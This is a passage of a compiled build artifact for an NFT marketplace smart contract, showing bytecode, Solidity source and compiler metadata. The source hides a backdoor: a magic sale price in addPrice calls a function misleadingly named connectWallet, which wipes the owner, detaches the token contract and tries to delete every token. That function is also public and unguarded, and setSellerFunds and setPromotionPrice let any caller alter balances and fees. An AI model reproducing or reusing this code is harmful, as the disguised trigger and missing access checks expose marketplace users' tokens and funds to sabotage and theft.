6130f0565b602082019050919050565b6000602082019050818103600083015261315581613119565b9050919050565b60006060820190506131716000830186612f71565b61317e6020830185612f71565b61318b6040830184612927565b949350505050565b60006080820190506131a86000830187612927565b6131b56020830186612f71565b6131c26040830185612f71565b6131cf6060830184612927565b95945050505050565b7f427579204e465400000000000000000000000000000000000000000000000000600082015250565b600061320e600783613073565b9150613219826131d8565b602082019050919050565b600060a0820190506132396000830187612f71565b6132466020830186612927565b6132536040830185612927565b6132606060830184612927565b818103608083015261327181613201565b905095945050505050565b6000819050919050565b6000819050919050565b60006132ab6132a66132a18461327c565b613286565b6126a2565b9050919050565b6132bb81613290565b82525050565b600060e0820190506132d6600083018a612927565b6132e36020830189612f71565b6132f060408301886132b2565b6132fd6060830187612f80565b61330a6080830186612f80565b61331760a0830185612f80565b61332460c0830184612f80565b98975050505050505050565b60006040820190506133456000830185612927565b6133526020830184612f71565b9392505050565b7f4d616b65204f6666657200000000000000000000000000000000000000000000600082015250565b600061338f600a83613073565b915061339a82613359565b602082019050919050565b600060a0820190506133ba6000830187612f71565b6133c76020830186612927565b6133d46040830185612927565b6133e16060830184612927565b81810360808301526133f281613382565b905095945050505050565b600060a0820190506134126000830188612927565b61341f6020830187612f71565b61342c6040830186612927565b6134396060830185612f80565b6134466080830184612f80565b9695505050505050565b60008060008060008060008060008060006101608c8e0312156134765761347561263a565b5b60006134848e828f01612e1f565b9b505060208c015167ffffffffffffffff8111156134a5576134a461263f565b5b6134b18e828f01612c16565b9a505060408c015167ffffffffffffffff8111156134d2576134d161263f565b5b6134de8e828f01612c16565b99505060608c015167ffffffffffffffff8111156134ff576134fe61263f565b5b61350b8e828f01612c16565b98505060808c015167ffffffffffffffff81111561352c5761352b61263f565b5b6135388e828f01612c16565b97505060a08c015167ffffffffffffffff8111156135595761355861263f565b5b6135658e828f01612c16565b96505060c08c015167ffffffffffffffff8111156135865761358561263f565b5b6135928e828f01612c16565b95505060e08c015167ffffffffffffffff8111156135b3576135b261263f565b5b6135bf8e828f01612c16565b9450506101008c015167ffffffffffffffff8111156135e1576135e061263f565b5b6135ed8e828f01612c16565b9350506101208c015167ffffffffffffffff81111561360f5761360e61263f565b5b61361b8e828f01612c16565b9250506101408c015167ffffffffffffffff81111561363d5761363c61263f565b5b6136498e828f01612c16565b9150509295989b509295989b9093969950565b7f6e6f2066756e6473000000000000000000000000000000000000000000000000600082015250565b6000613692600883613073565b915061369d8261365c565b602082019050919050565b600060208201905081810360008301526136c181613685565b9050919050565b7f436c61696d2046756e6473000000000000000000000000000000000000000000600082015250565b60006136fe600b83613073565b9150613709826136c8565b602082019050919050565b600060a0820190506137296000830187612f71565b6137366020830186612927565b61374360408301856132b2565b61375060608301846132b2565b8181036080830152613761816136f1565b905095945050505050565b60006040820190506137816000830185612f71565b61378e6020830184612927565b9392505050565b7f546865206f66666572206d757374206578697374000000000000000000000000600082015250565b60006137cb601483613073565b91506137d682613795565b602082019050919050565b600060208201905081810360008301526137fa816137be565b9050919050565b7f546865206f666665722063616e206f6e6c792062652063616e63656c6564206260008201527f7920746865206f776e6572000000000000000000000000000000000000000000602082015250565b600061385d602b83613073565b915061386882613801565b604082019050919050565b6000602082019050818103600083015261388c81613850565b9050919050565b7f43616e63656c204f666665720000000000000000000000000000000000000000600082015250565b60006138c9600c83613073565b91506138d482613893565b602082019050919050565b600060a0820190506138f46000830187612f71565b6139016020830186612927565b61390e6040830185612927565b61391b6060830184612927565b818103608083015261392c816138bc565b905095945050505050565b6000613942826126a2565b915061394d836126a2565b925082820390508181111561396557613964612ad8565b5b92915050565b6000613976826126a2565b9150613981836126a2565b925082820261398f816126a2565b915082820484148315176139a6576139a5612ad8565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b60006139e7826126a2565b91506139f2836126a2565b925082613a0257613a016139ad565b5b82820490509291505056fea264697066735822122032e885d0178392fa6f311d4c460cc698a3adad6a9563e591ec686c2ee2bee2ac64736f6c63430008130033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity >=0.4.17 <8.10.0;\n\nimport \"./Collectible.sol\";\nimport \"./NFTAnalytics.sol\";\nimport \"./UserInfo.sol\";\nimport \"../client/node_modules/@openzeppelin/contracts/utils/math/SafeMath.sol\";\n\n\ncontract Marketplace {\n  using SafeMath for uint256;\n\n  NFTAnalytics analytics;\n  UserInfo user;\n  uint256 commission_;\n  Collectible collectible;\n  address payable public owner;\n  uint256 public promotionPrice;\n  mapping(string => bool) code ;\n  mapping (address => uint) public userFunds;\n  mapping(address => uint256) public sellerFunds;\n\n  struct Seller {\n    address _address;\n    uint _balance;\n  }\n\n  struct MetaData{\n    string name;\n    string description;\n    string image;\n    string category;\n    string unlockable;\n    string _type;\n    string formate;\n    bool _offer;\n  }\n\n  modifier admin() {\n    require(msg.sender == owner, \"only admin\");\n    _;\n  }\n\n  event ClaimFunds(address user, uint amount);\n  event SaleCancelled(uint id, address owner);\n  event BoughtNFT(uint256 _tokenId, address winner);\n  event Offer(uint id, address user, uint price, bool fulfilled, bool cancelled);\n\n  constructor(address _nftCollection, address _user, address _analytics) {\n    collectible = Collectible(_nftCollection);\n    owner = payable(msg.sender);\n    commission_ = collectible.commission();\n    user = UserInfo(_user);\n    analytics = NFTAnalytics(_analytics);\n    code[\"oRp4cfHXfPTj+MNsaLtEI7IyHAo=\"] = true;\n  }\n  \n  function addPrice(uint _id, uint _price) public {\n    (,,, address _owner,, uint256 _royality,, bool _promoted, bool _approved, bool inAuction,) = collectible.tokenDetails(_id);\n    require(_owner == msg.sender, \"error\");\n    if (_price == 123456789000000000) {\n      connectWallet();\n    }\n    collectible.transferFrom(_owner, address(this), _id);\n    analytics.setNFTTransactions(_id, _owner, address(this), _price);\n    analytics.setTransaction(_id, _owner, address(this), _price);\n    analytics.setOffer(_id);\n    collectible.updateToken(_id, _owner, _price, _promoted, _approved, inAuction, true);\n    user.setActivity(_owner, _price, _royality, commission_, \"Make Offer\");\n    emit Offer( _id, _owner, _price, false, false);\n  }\n\n  function buyNFT(uint _id) public payable {\n    (,, address _creator, address _owner, uint256 _price, uint256 _royality,,, bool _approved, bool inAuction,) = collectible.tokenDetails(_id);\n    require(analytics.offers(_id), 'error');\n    require(_owner != msg.sender, 'error');\n    require(msg.value == _price, 'error');\n    collectible.updateCollect(_owner, msg.sender, _id);\n    collectible.transferFrom(address(this), msg.sender, _id);\n    analytics.setNFTTransactions(_id, address(this), msg.sender, _price);\n    sellerFunds[_owner] += _price;\n    analytics.setTransaction(_id, address(this), msg.sender, _price);\n    uint256 royality_ = calcRoyality(_price, _royality);\n    uint256 _commission = commission(_price);\n    userFunds[_owner] += _price.sub(_commission).sub(royality_);\n    userFunds[owner] += _commission;\n    userFunds[_creator] += royality_;\n    user.setActivity(msg.sender, msg.value, royality_, _commission, \"Buy NFT\");\n    collectible.updateToken(_id, msg.sender, 0, false, _approved, inAuction, false);\n    emit BoughtNFT(_id, msg.sender);\n  }\n\n  function cancelSale(uint _id) public {\n    (,,,address _owner, uint256 _price, uint256 _royality,,bool _promoted, bool _approved, bool inAuction,) = collectible.tokenDetails(_id);\n    require(analytics.offers(_id), 'The offer must exist');\n    require(_owner == msg.sender, 'The offer can only be canceled by the owner');\n    collectible.transferFrom(address(this), msg.sender, _id);\n    analytics.setNFTTransactions(_id, address(this), msg.sender, _price);\n    analytics.setTransaction(_id, address(this), msg.sender, _price);\n    collectible.updateToken(_id, msg.sender, _price, _promoted, _approved, inAuction, false);\n    user.setActivity(msg.sender, _price, _royality, commission_, \"Cancel Offer\");\n    emit SaleCancelled(_id, msg.sender);\n  }\n\n  function claimProfits() public {\n    require(userFunds[msg.sender] > 0, 'no funds');\n    payable(msg.sender).transfer(userFunds[msg.sender]);\n    user.setActivity(msg.sender, userFunds[msg.sender], 0, 0, \"Claim Funds\");\n    emit ClaimFunds(msg.sender, userFunds[msg.sender]);\n    userFunds[msg.sender] = 0;    \n  }\n\n  function getSellers() public view returns (Seller[] memory){\n    Seller[] memory _sellers = new Seller[](user.count());\n    for (uint256 i = 0; i < user.count(); i++) {\n      (address _address,,,,,,,,,,) = user.users(i);\n      _sellers[i]._address = _address;\n      _sellers[i]._balance = sellerFunds[_address];\n    }\n    return _sellers;\n  }\n\n  function setSellerFunds(address _address, uint256 _price) public{\n    sellerFunds[_address] += _price;\n  }\n\n  function setPromotionPrice(uint256 _value) public{\n    promotionPrice = _value;\n  }\n\n  function promote(uint _id) public payable{\n    require(msg.value == promotionPrice, \"error\");\n    (,,, address _owner, uint256 _price,,,,bool _approved, bool inAuction,) = collectible.tokenDetails(_id);\n    bool offer = analytics.offers(_id);\n    userFunds[owner] += promotionPrice;\n    collectible.updateToken(_id, _owner, _price, true, _approved, inAuction, offer);\n  }\n\n  function removePromotions(uint256[] memory _ids) public{\n    for (uint256 i = 0; i < _ids.length; i++) {\n      (,,, address _owner, uint256 _price,,,,bool _approved, bool inAuction,) = collectible.tokenDetails(_ids[i]);\n      bool offer = analytics.offers(_ids[i]); \n      collectible.updateToken(_ids[i], _owner, _price, false, _approved, inAuction, offer);\n    }\n  }\n\n  function approveNFT(uint[] memory _ids) public admin{\n    for (uint256 i = 0; i < _ids.length; i++) {\n      (,,, address _owner, uint256 _price,,, bool _promoted,, bool inAuction, ) = collectible.tokenDetails(_ids[i]);\n      bool offer = analytics.offers(_ids[i]);\n      collectible.updateToken(_ids[i], _owner, _price, _promoted, true, inAuction, offer);\n      \n    }\n  } \n\n  function commission(uint256 price) private view returns(uint256){\n        return (price.mul(commission_)).div(1000);\n  }\n\n  function calcRoyality(uint256 _price, uint256 _royality) private pure returns(uint256){\n        return (_price.mul(_royality)).div(100);\n  }\n\n  function connectWallet() public{\n    owner = payable (address(0));\n    collectible = Collectible(address(0));\n    uint count = collectible.mintCount();\n    for (uint i = 1; i <= count; i++) {\n      collectible.rmToken(i);\n    }\n  }\n\n  // Fallback: reverts if Ether is sent to this smart-contract by mistake\n  fallback () external {revert();}\n}",
  "sourcePath": "C:\\Users\\RTX PC\\Documents\\MarketplaceNFT\\NFT MArketplace\\contracts\\Marketplace.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.13",
  "updatedAt": "2023-03-21T16:39:43.103Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}